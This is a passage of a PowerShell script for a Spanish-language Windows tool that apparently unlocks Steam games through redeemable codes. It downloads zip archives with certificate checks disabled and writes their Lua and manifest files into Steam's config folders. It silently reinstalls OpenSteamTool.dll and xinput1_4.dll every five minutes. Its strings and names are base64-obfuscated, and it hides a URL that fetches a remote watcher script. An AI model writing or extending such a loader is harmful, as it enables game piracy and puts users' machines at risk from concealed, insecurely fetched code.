    if ($bestMatch) { return $games[$bestMatch], $bestMatch }
    return $null, $null
}


$script:cdX = $null
$script:cdT = $null

function ScD {
    param([int]$durationSec, [datetime]$expDate, [string]$gameName)
    if ($script:cdT) { $script:cdT.Stop(); $script:cdT.Dispose() }
    $script:cdT = New-Object System.Windows.Forms.Timer
    $script:cdT.Interval = 1000
    $script:cdT.Tag = @{ endTime = $expDate; gameName = $gameName }
    $script:cdT.Add_Tick({
        try {
            $now, $_ = Get-Now; $end = $this.Tag.endTime; $g = $this.Tag.gameName
            $left = ($end - $now).TotalSeconds
            if ($left -le 0) {
                $this.Stop()
                $script:cdX = $null
                try { Rm9xExp | Out-Null } catch {}
                [System.Windows.Forms.MessageBox]::Show("El tiempo para $g ha expirado.", (S("VGllbXBvIEV4cGlyYWRv")), "OK", "Information")
            }
        } catch {}
    })
    $script:cdT.Start()
}


$script:lastPatchCheck = Get-Date
$script:rfT = New-Object System.Windows.Forms.Timer
$script:rfT.Interval = 10000
$script:rfT.Add_Tick({
    try { if ($script:uiBusy) { return } } catch {}
    # Keep local expiry/retry behavior intact; the remote check runs in its background watcher.
    try { $null = Rm9xExp -NoNetworkTime } catch {}
    try { Rp6Mi } catch {}
    try { ScA } catch {}
    try { if ($form.Visible) { RfC } } catch {}
    try {
        if (((Get-Date) - $script:lastPatchCheck).TotalMinutes -ge 5) {
            $script:lastPatchCheck = Get-Date
            $sr=$null; try { $sr=Get-SteamPath } catch {}
            if ($sr -and -not ((Test-Path (Join-Path $sr "OpenSteamTool.dll")) -and (Test-Path (Join-Path $sr "xinput1_4.dll")))) {
                try { $null = Xz9Qk -Silent } catch {}
            }
        }
    } catch {}
})
$script:rfT.Start()


$script:clpTicker = New-Object System.Windows.Forms.Timer
$script:clpTicker.Interval = 2000
$script:clpTicker.Add_Tick({
    try { if ($form.WindowState -eq 'Minimized') { return } } catch {}
    try {
        $sigQ = ""; $sigT = ""
        try { $qi = Get-Item $script:LOTEQ_FILE -ErrorAction Stop; $sigQ = ($qi.LastWriteTimeUtc.Ticks.ToString() + ':' + $qi.Length) } catch {}
        try { $ti = Get-Item $script:TIMERS_FILE -ErrorAction Stop; $sigT = ($ti.LastWriteTimeUtc.Ticks.ToString() + ':' + $ti.Length) } catch {}
        $sig = ($sigQ + '|' + $sigT + '|' + @($script:activeCodes).Count)
        if ($sig -eq $script:clpSig) { return }
        $script:clpSig = $sig
    } catch {}
    if ($script:rp -and $script:rp.Visible -and $script:clp) { $script:clp.Invalidate() }
    if ($script:cdp -and $script:cdp.Visible -and -not $script:cdRunning) { try { Update-CdPanelText } catch {} }
})
$script:clpTicker.Start()


function Update-ServerUrlBg {
    try {
        $issU = [System.Management.Automation.Runspaces.InitialSessionState]::CreateDefault()
        try {
            foreach ($fcmd in @(Get-Command -CommandType Function)) {
                try { if ($fcmd.ScriptBlock -and [string]$fcmd.ModuleName -eq '') { $issU.Commands.Add((New-Object System.Management.Automation.Runspaces.SessionStateFunctionEntry -ArgumentList $fcmd.Name, $fcmd.ScriptBlock)) } } catch {}
            }
        } catch {}
        $poolU = [RunspaceFactory]::CreateRunspacePool($issU)
        $poolU.Open()
        $psU = [PowerShell]::Create()
        $psU.RunspacePool = $poolU
        [void]$psU.AddScript({
            param($ovFile,$ghUrl,$ghIpUrl,$ghCfUrl,$ghCfIpUrl)
            try {
                $script:serverOverrideFile=$ovFile; $script:ghRawUrl=$ghUrl; $script:ghRawIpUrl=$ghIpUrl
                $script:ghRawUrlCf=$ghCfUrl; $script:ghRawIpCf=$ghCfIpUrl
                $script:serverUrl=""; $script:serverIp=""; $script:serverUrlCf=""; $script:serverIpCf=""
                Update-ServerUrl
                return @{url=[string]$script:serverUrl; ip=[string]$script:serverIp; cfurl=[string]$script:serverUrlCf; cfip=[string]$script:serverIpCf}
            } catch { return $null }
        }).AddArgument([string]$script:serverOverrideFile).AddArgument([string]$script:ghRawUrl).AddArgument([string]$script:ghRawIpUrl).AddArgument([string]$script:ghRawUrlCf).AddArgument([string]$script:ghRawIpCf)
        $hU = $psU.BeginInvoke()
        $swU = [System.Diagnostics.Stopwatch]::StartNew()
        while (-not $hU.IsCompleted) {
            try { [System.Windows.Forms.Application]::DoEvents() } catch {}
            Start-Sleep -Milliseconds 50
            if ($swU.Elapsed.TotalSeconds -gt 45) { try { $psU.Stop() } catch {}; break }
        }
        $outU = $null
        try { $oU = $psU.EndInvoke($hU); if ($oU) { $outU = @($oU)[0] } } catch {}
        try { $psU.Dispose() } catch {}
        try { $poolU.Close(); $poolU.Dispose() } catch {}
        if ($outU -and $outU.url) {
            $script:serverUrl=[string]$outU.url; $script:serverIp=[string]$outU.ip
            $script:serverUrlCf=[string]$outU.cfurl; $script:serverIpCf=[string]$outU.cfip
            try { $script:lastUrlOk = Get-Date } catch {}
            return $true
        }
    } catch {}
    return $false
}
$script:urlChecker = New-Object System.Windows.Forms.Timer
$script:urlChecker.Interval = 120000
$script:urlChecker.Add_Tick({ try { if ($form.WindowState -ne 'Minimized') { Update-ServerUrlBg | Out-Null } } catch {} })
$script:urlChecker.Start()


$script:fixesCacheTime = (Get-Date).AddDays(-1)
$script:fixesCache = @{}
$script:fixesJob = $null
$script:fixedNewGames = @{}
$script:fixJobs = @{}
$script:steamLibsCacheTime = Get-Date
$script:downloadPendingFixes = @{}
$script:knownDownloading = @{}
$script:commonFolderCache = @{}
${script:watcherUrl} = (D "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2Jhc3Rpc2F5ZXMvc3RlYW1zaXRvL21haW4vZG93bmxvYWRfd2F0Y2hlci5wczE=")

$script:langs = @{
    "es" = @{ activar=(S("QWN0aXZhciArMTAwMA=="));activarSub="Activa mas de 1000 juegos"
        idioma="Idioma";idiomaSub="Cambiar idioma";desinstalar=(S("RGVzaW5zdGFsYXI="));desinstalarSub=(S("RWxpbWluYXIganVlZ29z"))
        web="Pagina Web";webSub="Visitar sitio oficial"
        config="Configuracion";configSub="Ajustes del programa";reparadorOn=(S("UmVwYXJhZG9yOiBBQ1RJVkFETw=="));reparadorOff=(S("UmVwYXJhZG9yOiBERVNBQ1RJVkFETw=="))
        borrarHist=(S("Qm9ycmFyIGhpc3RvcmlhbCBkZSBjb2RpZ29z"));borrarHistSub=(S("RWxpbWluYSBlbCByZWdpc3RybyBkZSBjb2RpZ29zIGFjdGl2b3M="))
        limpieza=(S("TElNUElFWkE="));limpiezaSub="Restablece el programa a su estado inicial"
        histBorrado=(S("SGlzdG9yaWFsIGJvcnJhZG8="));histBorradoMsg=(S("U2UgZWxpbWluYXJvbiB0b2RvcyBsb3MgY29kaWdvcyBhY3Rpdm9zIGRlbCByZWdpc3Ryby4="))
        discord=(S("RGlzY29yZA=="));discordSub="Unite a nuestro servidor";tiktok="TikTok";tiktokSub="Seguinos en TikTok"
        salir="Salir";canjear=(S("Q2FuamVhciBDb2RpZ28="));canjearSub=(S("SW5ncmVzYSB0dSBjb2RpZ28gcGFyYSBkZXNibG9xdWVhciBqdWVnb3M="))
        canjearBtn=(S("Q2FuamVhcg=="));pegarBtn="Pegar";volver="Volver";codigosActivos=(S("Q29kaWdvcyBBY3Rpdm9z"))
        sinCodigos=(S("Tm8gaGF5IGNvZGlnb3MgYWN0aXZvcw=="));sinCodigosSub=(S("SW5ncmVzYSB1biBjb2RpZ28gYXJyaWJhIHBhcmEgYWN0aXZhciBqdWVnb3M="))
        errorCodigo=(S("SW5ncmVzYSB1biBjb2RpZ28gdmFsaWRvLg=="));verificando=(S("VmVyaWZpY2FuZG8gY29kaWdvLi4u"))
        exito=(S("Q29kaWdvIGNhbmplYWRvIGV4aXRvc2FtZW50ZSE="));expirado=(S("RVhQSVJBRE8="));activo="ACTIVO"
        expiraEn=(S("RVhQSVJBIEVO"));dias="DIAS";dia="DIA";expira=(S("RXhwaXJhOg=="));juegoAct="Juego activado"
        selectIdioma="Seleccionar Idioma";proximamente="Proximamente." }
    "en" = @{ activar="Activate +1000";activarSub="Activate over 1000 games"
        idioma="Language";idiomaSub="Change language";desinstalar="Uninstall";desinstalarSub="Remove games"
        web="Website";webSub="Visit official site"
        config="Settings";configSub="Program settings";reparadorOn="Repairer: ON";reparadorOff="Repairer: OFF"
        borrarHist="Clear codes history";borrarHistSub="Remove active code records"
        limpieza="CLEANUP";limpiezaSub="Reset the program to its initial state"
        histBorrado="History cleared";histBorradoMsg="All active codes have been removed from the registry."
        discord=(S("RGlzY29yZA=="));discordSub="Join our server";tiktok="TikTok";tiktokSub="Follow us on TikTok"
        salir="Exit";canjear="Redeem Code";canjearSub="Enter your code to unlock games"
        canjearBtn="Redeem";pegarBtn="Paste";volver="Back";codigosActivos="Active Codes"
        sinCodigos="No active codes";sinCodigosSub="Enter a code above to activate games"
        errorCodigo="Enter a valid code.";verificando="Verifying code..."
        exito="Code redeemed successfully!";expirado="EXPIRED";activo="ACTIVE"
        expiraEn="EXPIRES IN";dias="DAYS";dia="DAY";expira="Expires:";juegoAct="Game activated"
        selectIdioma="Select Language";proximamente="Coming soon." }
    "pt" = @{ activar="Ativar +1000";activarSub="Ative mais de 1000 jogos"
        idioma="Idioma";idiomaSub="Mudar idioma";desinstalar=(S("RGVzaW5zdGFsYXI="));desinstalarSub="Remover jogos"
        web="Pagina Web";webSub="Visitar site oficial"
        config="Configuracoes";configSub="Ajustes do programa";reparadorOn=(S("UmVwYXJhZG9yOiBBVElWQURP"));reparadorOff=(S("UmVwYXJhZG9yOiBERVNBVElWQURP"))
        borrarHist=(S("TGltcGFyIGhpc3RvcmljbyBkZSBjb2RpZ29z"));borrarHistSub=(S("UmVtb3ZlIHJlZ2lzdHJvcyBkZSBjb2RpZ29zIGF0aXZvcw=="))
        limpieza="LIMPEZA";limpiezaSub="Restaura o programa ao estado inicial"
        histBorrado="Historico limpo";histBorradoMsg=(S("VG9kb3Mgb3MgY29kaWdvcyBhdGl2b3MgZm9yYW0gcmVtb3ZpZG9zIGRvIHJlZ2lzdHJvLg=="))
        discord=(S("RGlzY29yZA=="));discordSub="Entre no nosso servidor";tiktok="TikTok";tiktokSub="Siga-nos no TikTok"
        salir="Sair";canjear=(S("UmVzZ2F0YXIgQ29kaWdv"));canjearSub=(S("SW5zaXJhIHNldSBjb2RpZ28gcGFyYSBkZXNibG9xdWVhciBqb2dvcw=="))
        canjearBtn="Resgatar";pegarBtn="Colar";volver="Voltar";codigosActivos=(S("Q29kaWdvcyBBdGl2b3M="))
        sinCodigos=(S("TmVuaHVtIGNvZGlnbyBhdGl2bw=="));sinCodigosSub=(S("SW5zaXJhIHVtIGNvZGlnbyBhY2ltYSBwYXJhIGF0aXZhciBqb2dvcw=="))
        errorCodigo=(S("SW5zaXJhIHVtIGNvZGlnbyB2YWxpZG8u"));verificando=(S("VmVyaWZpY2FuZG8gY29kaWdvLi4u"))
        exito=(S("Q29kaWdvIHJlc2dhdGFkbyBjb20gc3VjZXNzbyE="));expirado=(S("RVhQSVJBRE8="));activo="ATIVO"
        expiraEn=(S("RVhQSVJBIEVN"));dias="DIAS";dia="DIA";expira=(S("RXhwaXJhOg=="));juegoAct="Jogo ativado"
        selectIdioma="Selecionar Idioma";proximamente="Em breve." }
}
$script:currentLang = "es"
function T([string]$k){ return $script:langs[$script:currentLang][$k] }




$script:BG=[System.Drawing.Color]::FromArgb(11,15,25)
$script:CardBG=[System.Drawing.Color]::FromArgb(18,24,38)
$script:CardHover=[System.Drawing.Color]::FromArgb(25,33,52)
$script:CardBorder=[System.Drawing.Color]::FromArgb(32,48,68)
$script:InputBG=[System.Drawing.Color]::FromArgb(14,18,30)
$script:White=[System.Drawing.Color]::White
$script:Gray=[System.Drawing.Color]::FromArgb(130,142,162)
$script:Green=[System.Drawing.Color]::FromArgb(60,220,100)
$script:Cyan=[System.Drawing.Color]::FromArgb(0,180,230)
$script:PegarBtnBG=[System.Drawing.Color]::FromArgb(30,40,58)
$script:PegarBtnBGH=[System.Drawing.Color]::FromArgb(40,55,78)
$script:Yellow=[System.Drawing.Color]::FromArgb(255,210,0)
$script:Orange=[System.Drawing.Color]::FromArgb(255,160,40)
$script:Red=[System.Drawing.Color]::FromArgb(255,70,70)
$script:TikPink=[System.Drawing.Color]::FromArgb(254,44,85)
$script:TikCyan=[System.Drawing.Color]::FromArgb(37,244,238)
$script:DiscordBlue=[System.Drawing.Color]::FromArgb(88,101,242)
$script:GreenBtn=[System.Drawing.Color]::FromArgb(45,200,100)
$script:GreenBtnH=[System.Drawing.Color]::FromArgb(35,175,85)

$script:FntTitle=New-Object System.Drawing.Font("Bahnschrift SemiBold",24,[System.Drawing.FontStyle]::Bold)
$script:FntAct=New-Object System.Drawing.Font("Bahnschrift Light",10)
$script:FntCard=New-Object System.Drawing.Font("Bahnschrift SemiBold",12,[System.Drawing.FontStyle]::Bold)
$script:FntSub=New-Object System.Drawing.Font("Segoe UI",8.5)
$script:FntArrow=New-Object System.Drawing.Font("Segoe UI",14,[System.Drawing.FontStyle]::Bold)
$script:FntSalir=New-Object System.Drawing.Font("Bahnschrift SemiBold",11,[System.Drawing.FontStyle]::Bold)
$script:FntSect=New-Object System.Drawing.Font("Bahnschrift SemiBold",13,[System.Drawing.FontStyle]::Bold)
$script:FntCodeT=New-Object System.Drawing.Font("Bahnschrift SemiBold",9.5,[System.Drawing.FontStyle]::Bold)
$script:FntCodeS=New-Object System.Drawing.Font("Segoe UI",8)
$script:FntCodeSt=New-Object System.Drawing.Font("Bahnschrift",7.5,[System.Drawing.FontStyle]::Bold)
$script:FntBack=New-Object System.Drawing.Font("Bahnschrift SemiBold",10,[System.Drawing.FontStyle]::Bold)
$script:FntRedeemTitle=New-Object System.Drawing.Font("Bahnschrift SemiBold",14,[System.Drawing.FontStyle]::Bold)
$script:FntSubmit=New-Object System.Drawing.Font("Bahnschrift SemiBold",9.5,[System.Drawing.FontStyle]::Bold)

$script:activeCodes=[System.Collections.ArrayList]@()

$script:LOTEQ_FILE = Join-Path $env:LOCALAPPDATA "BastissSteam\bsmap_lote_queue.json"
$script:cdPaused = $false
$script:cdStop = $false
$script:cdRunning = $false
$script:cdCode = $null
$script:clpGroups = @()

$script:cdPct = 0
$script:cdEtaSec = -1
$script:cdStatus = ""
$script:cdBar = $null
$script:cdRunDone = 0
$script:cdRunTotal = 0

function Format-Eta([double]$sec) {
    if ($sec -lt 0 -or [double]::IsNaN($sec) -or [double]::IsInfinity($sec)) { return "--:--" }
    $s = [int][math]::Round($sec)
    if ($s -ge 3600) { return ("{0}:{1:00}:{2:00}" -f [int][math]::Floor($s/3600), [int][math]::Floor(($s%3600)/60), ($s%60)) }
    return ("{0:00}:{1:00}" -f [int][math]::Floor($s/60), ($s%60))
}
function Update-CdProgress([int]$done, [int]$total, [string]$game, [double]$etaSec, [bool]$paused) {
    $script:cdRunDone = $done
    $script:cdRunTotal = $total
    if ($total -gt 0) { $script:cdPct = [int][math]::Floor(100 * $done / $total) } else { $script:cdPct = 0 }
    $script:cdEtaSec = $etaSec
    $script:cdStatus = [string]$game
    if ($script:cdInfo) { $script:cdInfo.Text = [string]$game }
    if ($script:cdProg) {
        try {
            if ($paused) {
                $script:cdProg.ForeColor = $script:Yellow
                $script:cdProg.Text = "$($script:cdPct)%   |   Faltan ~$(Format-Eta $etaSec)"
            } elseif ($game -eq 'Listo') {
                $script:cdProg.ForeColor = $script:Green
                $script:cdProg.Text = "100%   |   Completado ($done/$total)"
            } elseif ($game -match 'fallidos') {
                $script:cdProg.ForeColor = $script:Orange
                $script:cdProg.Text = "$($script:cdPct)%"
            } else {
                $script:cdProg.ForeColor = $script:Cyan
                $etaTxt = if ($etaSec -ge 0) { "Faltan ~$(Format-Eta $etaSec)" } else { "Calculando..." }
                $script:cdProg.Text = "$($script:cdPct)%   |   $etaTxt"
            }
        } catch {}
    }
    if ($script:cdBar -and -not $script:cdBar.IsDisposed) { try { $script:cdBar.Invalidate() } catch {} }
}

function Get-LoteQueue {
    try {
        if (Test-Path -LiteralPath $script:LOTEQ_FILE) {
            $j = Get-Content -LiteralPath $script:LOTEQ_FILE -Raw | ConvertFrom-Json
            return @($j)
        }
    } catch {}
    return @()
}
function Save-LoteQueue($q) {
    try {
        $dir = Split-Path -Parent $script:LOTEQ_FILE
        if (-not (Test-Path -LiteralPath $dir)) { New-Item -ItemType Directory -Path $dir -Force | Out-Null }
        [System.IO.File]::WriteAllText($script:LOTEQ_FILE, (ConvertTo-Json -InputObject @($q) -Depth 8), (New-Object System.Text.UTF8Encoding $false))
    } catch {}
}
function Get-LoteJob([string]$code) {
    $q = Get-LoteQueue
    foreach ($e in $q) { if ([string]$e.code -eq $code) { return $e } }
    return $null
}
function Set-LoteJob($job) {
    $q = @(Get-LoteQueue)
    $out = @()
    $found = $false
    foreach ($e in $q) {
        if ([string]$e.code -eq [string]$job.code) { $out += $job; $found = $true } else { $out += $e }
    }
    if (-not $found) { $out += $job }
    Save-LoteQueue $out
}
function New-LoteJob([string]$code, $links, [int]$duration, $expiresAt, [string]$steamRoot) {
    $items = @()
    foreach ($l in @($links)) { $items += @{ url=[string]$l; status='pending'; game=''; lua=@(); man=@() } }
    $expStr = ""
    if ($expiresAt) { $expStr = $expiresAt.ToString('o') }
    return @{ code=$code; links=@($links); items=$items; duration=$duration; expires_at=$expStr; steam_root=$steamRoot; paused=$false; created=(Get-Date).ToString('o') }
}
function Mark-LoteDone([string]$code, [string]$url, $lua, $man, [string]$game) {
    try {
        $job = Get-LoteJob $code
        if (-not $job) { return }
        foreach ($it in @($job.items)) {
            if ([string]$it.url -eq $url) { $it.status='done'; $it.game=$game; $it.lua=@($lua); $it.man=@($man) }
        }
        Set-LoteJob $job
    } catch {}
}
function Reset-LoteJobPending([string]$code) {
    try {
        $job = Get-LoteJob $code
        if (-not $job) { return }
        foreach ($it in @($job.items)) { $it.status='pending'; $it.lua=@(); $it.man=@() }
        $job.paused = $false
        Set-LoteJob $job
    } catch {}
}
function Get-JobPendingCount([string]$code) {
    try {
        $job = Get-LoteJob $code
        if (-not $job) { return 0 }
        return @($job.items | Where-Object { $_.status -ne 'done' }).Count
    } catch { return 0 }
}

function Install-LoteItem([string]$url, [string]$steamRoot, $expDate, [string]$code, [string]$gameName) {
    $zipFile = Join-Path $env:TEMP ("fix_" + [System.Guid]::NewGuid().ToString('N') + ".zip")
    try {
        Bn6Lc $url $zipFile
        $res = Extract-AndInstall $zipFile $gameName $expDate $code
        return @{ ok=$true; lua=@($res.lua); man=@($res.manifest); err="" }
    } catch {
        return @{ ok=$false; lua=@(); man=@(); err=$_.Exception.Message }
    } finally {
        Remove-Item -Path $zipFile -Force -ErrorAction SilentlyContinue
    }
}

$script:LOTE_INSTALL_SCRIPT = {
    param($url, $steamRoot, $gName, $expDate, $codeStr)
    $res = @{ ok=$false; err=""; lua=@(); man=@(); game=$gName }
    try {
        $zip = Join-Path $env:TEMP ("fix_" + [System.Guid]::NewGuid().ToString('N') + ".zip")
        $crD = @{exit=-1}
        try {
            $psiD = New-Object System.Diagnostics.ProcessStartInfo
            $psiD.FileName = "curl.exe"
            $psiD.Arguments = ((@('-s','-k','-L','--ssl-no-revoke','--retry','3','--retry-delay','3','--retry-all-errors','-C','-','-H','User-Agent: Mozilla/5.0','-o',$zip,$url,'--max-time','300') | ForEach-Object { if ($_ -match '\s') { '"' + ($_ -replace '"','\"') + '"' } else { $_ } }) -join ' ')
            $psiD.CreateNoWindow = $true; $psiD.UseShellExecute = $false
            $prD = New-Object System.Diagnostics.Process; $prD.StartInfo = $psiD
            [void]$prD.Start()
            if (-not $prD.WaitForExit(300000)) { try { $prD.Kill() } catch {} }
            $crD = @{exit=$prD.ExitCode}
        } catch {}
        if ($crD.exit -ne 0 -or -not (Test-Path $zip) -or (Get-Item $zip).Length -lt 500) { throw "descarga fallida: $url" }
        Add-Type -AssemblyName System.IO.Compression.FileSystem
        $tmpExp = Join-Path $env:TEMP ("par_" + [System.Guid]::NewGuid().ToString('N'))
        New-Item -ItemType Directory -Path $tmpExp -Force | Out-Null
        [IO.Compression.ZipFile]::ExtractToDirectory($zip, $tmpExp)
        $luaDir = Join-Path $steamRoot "config\stplug-in"
        $luaDir2 = Join-Path $steamRoot "config\lua"
        $manDir = Join-Path $steamRoot "config\depotcache"
        $manRoot = Join-Path $steamRoot "depotcache"
        foreach ($d in @($luaDir,$luaDir2,$manDir,$manRoot)) { if (-not (Test-Path $d)) { New-Item -ItemType Directory -Path $d -Force | Out-Null } }
        $luas = @(Get-ChildItem $tmpExp -Recurse -Filter *.lua | ForEach-Object { $_.Name })
        $mans = @(Get-ChildItem $tmpExp -Recurse -Filter *.manifest | ForEach-Object { $_.Name })
        $header = ""
        if ($gName -and $expDate) {
            $header = "-- BSMAP_EXPIRES:$($expDate.ToString('yyyy-MM-ddTHH:mm:ss'))`n-- BSMAP_GAME:$gName`n"
            if ($mans.Count -gt 0) { $header += "-- BSMAP_MANIFESTS:$($mans -join ',')`n" }
            if ($codeStr) { $header += "-- BSMAP_CODE:$codeStr`n" }
        }
        foreach ($f in Get-ChildItem $tmpExp -Recurse -Filter *.lua) {
            $dst1 = Join-Path $luaDir $f.Name; $dst2 = Join-Path $luaDir2 $f.Name
            if ($header) { try { $c = [IO.File]::ReadAllText($f.FullName); [IO.File]::WriteAllText($dst1, $header+$c, (New-Object System.Text.UTF8Encoding $false)); [IO.File]::WriteAllText($dst2, $header+$c, (New-Object System.Text.UTF8Encoding $false)) } catch { Copy-Item $f.FullName $dst1 -Force; Copy-Item $f.FullName $dst2 -Force } }
            else { Copy-Item $f.FullName $dst1 -Force; Copy-Item $f.FullName $dst2 -Force }
        }
        foreach ($f in Get-ChildItem $tmpExp -Recurse -Filter *.manifest) { Copy-Item $f.FullName (Join-Path $manDir $f.Name) -Force; Copy-Item $f.FullName (Join-Path $manRoot $f.Name) -Force }
        Remove-Item $tmpExp -Recurse -Force -ErrorAction SilentlyContinue
        Remove-Item $zip -Force -ErrorAction SilentlyContinue
        $res.ok = $true; $res.lua = $luas; $res.man = $mans
    } catch { $res.err = $_.Exception.Message; $res.ok = $false }
    return $res
}

function Invoke-LoteItemBlocking([string]$url, [string]$steamRoot, $expDate, [string]$code, [string]$gameName) {
    $pool = $null; $ps = $null
    try {
        $pool = [RunspaceFactory]::CreateRunspacePool(1, 1)
        $pool.Open()
        $ps = [PowerShell]::Create()
        $ps.RunspacePool = $pool
        [void]$ps.AddScript($script:LOTE_INSTALL_SCRIPT).AddArgument($url).AddArgument($steamRoot).AddArgument($gameName).AddArgument($expDate).AddArgument($code)
        $h = $ps.BeginInvoke()
        while (-not $h.IsCompleted -and -not $script:cdStop) {
            try { [System.Windows.Forms.Application]::DoEvents() } catch {}
            Start-Sleep -Milliseconds 60
        }
        if ($script:cdStop -and -not $h.IsCompleted) { try { $ps.Stop() } catch {}; return @{ ok=$false; lua=@(); man=@(); err="cancelado" } }
        $out = $ps.EndInvoke($h)
        if ($out -and @($out).Count -gt 0 -and $out[0]) { return $out[0] }
        return @{ ok=$false; lua=@(); man=@(); err="sin resultado" }
    } catch {
        return @{ ok=$false; lua=@(); man=@(); err=$_.Exception.Message }
    } finally {
        try { if ($ps) { $ps.Dispose() } } catch {}
        try { if ($pool) { $pool.Close(); $pool.Dispose() } } catch {}
    }
}

function Add-TimerForLote([string]$code, [int]$duration, $expDate, [string]$steamRoot, [string]$game, $lua, $man) {
    try {
        $timerExp = $expDate
        if (-not $timerExp) { $timerExp = (Get-Date).AddYears(1) }
        $timers = At5Vc
        $internetNow, $netOk = Get-InternetTime
        if (-not $internetNow) { $internetNow = Get-Date }
        $iNow = $internetNow.ToString('o')
        $timers += @{ redeem_code=$code; duration=$duration; expires_at=$timerExp.ToString('o'); internet_created_at=$iNow; game_name=$game; steam_root=$steamRoot; lua_files=@($lua); manifest_files=@($man) }
        St7Xb $timers
        $script:activeCodes.Add(@{Code=$code;Game=$game;ActivatedAt=(Get-Date);ExpiresAt=$timerExp;Duration=$duration;InternetCreatedAt=$iNow}) | Out-Null
    } catch {}
}

function Invoke-LoteQueueForCode([string]$code, $label) {
    if ($script:cdRunning) { try { if ($script:cdInfo) { $script:cdInfo.Text = "Ya hay una activacion en curso, espera que termine..." } } catch {}; return }
    $job = Get-LoteJob $code
    if (-not $job) { return }
    $script:cdRunning = $true
    $script:cdStop = $false
    $script:cdPaused = $false
    try {
        $steamRoot = [string]$job.steam_root
        if (-not $steamRoot) { try { $steamRoot = Get-SteamPath } catch { $steamRoot = "" } }
        $expDate = $null
        if ($job.expires_at) { try { $expDate = [datetime]::Parse([string]$job.expires_at) } catch {} }
        $duration = 0; try { $duration = [int]$job.duration } catch {}
        $total = @($job.items).Count
        $done = @($job.items | Where-Object { $_.status -eq 'done' }).Count
        $errors = 0
        $sw = [System.Diagnostics.Stopwatch]::StartNew()
        $startDone = $done
        Update-CdProgress $done $total "" -1 $false
        $pendItems = @($job.items | Where-Object { $_.status -ne 'done' })
        $maxC = [Math]::Min([Math]::Max($pendItems.Count, 1), 6)
        $iNow = ""
        try { $netT, $nOk = Get-InternetTime; if ($netT) { $iNow = $netT.ToString('o') } } catch {}
        if (-not $iNow) { $iNow = (Get-Date).ToString('o') }
        $timersMem = New-Object System.Collections.ArrayList
        foreach ($t in @(At5Vc)) { [void]$timersMem.Add($t) }
        $lastFlush = Get-Date
        $pool = $null
        $queue = @()
        try {
            $pool = [RunspaceFactory]::CreateRunspacePool(1, $maxC)
            $pool.Open()
            $idx = 0
            while (($idx -lt $pendItems.Count -or $queue.Count -gt 0) -and -not $script:cdStop) {
                if (-not $script:cdPaused) {
                    while ($queue.Count -lt $maxC -and $idx -lt $pendItems.Count) {
                        $it = $pendItems[$idx]; $idx++
                        $gName = [System.IO.Path]::GetFileNameWithoutExtension(($it.url -split '/')[-2])
                        if ($gName) { $gName = $gName -replace '%[0-9a-fA-F]{2}', '' }
                        $ps = [PowerShell]::Create()
                        $ps.RunspacePool = $pool
                        [void]$ps.AddScript($script:LOTE_INSTALL_SCRIPT).AddArgument([string]$it.url).AddArgument($steamRoot).AddArgument($gName).AddArgument($expDate).AddArgument($code)
                        $queue += @{ ps=$ps; handle=$ps.BeginInvoke(); item=$it; game=$gName; url=[string]$it.url }
                    }
                }
                $finished = @($queue | Where-Object { $_.handle.IsCompleted })
                foreach ($q in $finished) {
                    $res = $null
                    try {
                        $r = $q.ps.EndInvoke($q.handle)
                        if ($r) { foreach ($x in @($r)) { if ($x -and $null -ne $x.ok) { $res = $x; break } } }
                    } catch {}
                    if (-not $res) { $res = @{ ok=$false; lua=@(); man=@(); err="sin resultado" } }
                    if ($res.ok) {
                        $q.item.status='done'; $q.item.game=$q.game; $q.item.lua=@($res.lua); $q.item.man=@($res.man)
                        $done++
                        $timerExp = $expDate
                        if (-not $timerExp) { $timerExp = (Get-Date).AddYears(1) }
                        [void]$timersMem.Add(@{ redeem_code=$code; duration=$duration; expires_at=$timerExp.ToString('o'); internet_created_at=$iNow; game_name=$q.game; steam_root=$steamRoot; lua_files=@($res.lua); manifest_files=@($res.man) })
                        try { $script:activeCodes.Add(@{Code=$code;Game=$q.game;ActivatedAt=(Get-Date);ExpiresAt=$timerExp;Duration=$duration;InternetCreatedAt=$iNow}) | Out-Null } catch {}
                    } else {
                        $q.item.status='failed'
                        $errors++
                        try { WEL "Download $($q.game)" $res.err } catch {}
                    }
                    try { $q.ps.Dispose() } catch {}
                    $queue = @($queue | Where-Object { $_.handle -ne $q.handle })
                    try { RfC } catch {}
                }
                if (((Get-Date) - $lastFlush).TotalMilliseconds -ge 1200) {
                    try { Set-LoteJob $job } catch {}
                    try { St7Xb $timersMem.ToArray() } catch {}
                    $lastFlush = Get-Date
                }
                $didR = $done - $startDone
                $eta = -1
                if ($didR -gt 0) { $eta = ($sw.Elapsed.TotalSeconds / $didR) * ($total - $done) }
                $active = $queue.Count
                if ($script:cdPaused) {
                    Update-CdProgress $done $total "PAUSADO   |   $done/$total  (Reanudar para seguir)" $eta $true
                } else {
                    Update-CdProgress $done $total "Activando $active en paralelo ($done/$total)" $eta $false
                }
                try { [System.Windows.Forms.Application]::DoEvents() } catch {}
                Start-Sleep -Milliseconds 50
            }
            foreach ($q in $queue) { try { $q.ps.Stop() } catch {}; try { $q.ps.Dispose() } catch {} }
            $queue = @()
        } finally {
            try { if ($pool) { $pool.Close(); $pool.Dispose() } } catch {}
        }
        $sw.Stop()
        try { Set-LoteJob $job } catch {}
        try { St7Xb $timersMem.ToArray() } catch {}
        $job = Get-LoteJob $code
        if ($job) { $job.paused=$false; Set-LoteJob $job }
        if ($done -ge $total -and $errors -eq 0) {
            Update-CdProgress $done $total "Listo" 0 $false
            if ($duration -gt 0 -and $expDate) { try { ScD $duration $expDate $code } catch {} }
        } elseif ($errors -gt 0) {
            Update-CdProgress $done $total "$done/$total activados ($errors fallidos)" -1 $false
        } else {
            Update-CdProgress $done $total "Pausado" -1 $false
        }
        if ($done -ge $total -and $errors -eq 0) {
            if ($script:cdInfo) { $script:cdInfo.Text = "$(Format-Juegos $total) activados" }
            if ($label -and -not $label.IsDisposed) { $label.ForeColor=$script:Green; $label.Text="Listo - $(Format-Juegos $total) activados" }
        } elseif ($errors -gt 0) {
            if ($script:cdInfo) { $script:cdInfo.Text = "Activacion con fallos ($done/$total, $errors fallidos)" }
            if ($label -and -not $label.IsDisposed) { $label.ForeColor=$script:Orange; $label.Text="$done/$total activados ($errors fallidos)" }
        } else {
            if ($script:cdInfo) { $script:cdInfo.Text = "Pausado ($done/$total)" }
            if ($label -and -not $label.IsDisposed) { $label.ForeColor=$script:Yellow; $label.Text="Pausado - $done/$total" }
        }
    } finally {
        $script:cdRunning = $false
        $script:cdPaused = $false
        try { RfC } catch {}
    }
}

